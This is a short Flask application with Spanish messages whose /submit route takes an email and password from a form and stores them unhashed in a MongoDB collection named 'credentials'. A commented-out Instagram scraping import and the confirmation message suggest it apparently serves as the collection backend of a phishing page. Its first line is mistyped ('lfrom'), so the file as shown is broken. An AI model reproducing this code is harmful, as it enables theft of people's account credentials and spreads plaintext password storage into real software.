lfrom flask import Flask, request, render_template, jsonify
#import instaloader
import pymongo
from pymongo import MongoClient
import os
import logging

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

mongo_uri = os.getenv("MONGODB_URI")

try:
    client = MongoClient(mongo_uri)
    db = client.mydatabase
    collection = db.credentials
    logger.info("CONEXIÓN ESTABLECIDA CON MONGODB")
except Exception as e:
    logger.error(f"Error al conectar a MongoDB: {e}")

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el procesamiento del formulario
@app.route('/submit', methods=['POST'])
def submit():
    try:
        email = request.form['email']
        password = request.form['password']
        collection.insert_one({"email": email, "password": password})
        return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(port=5001)
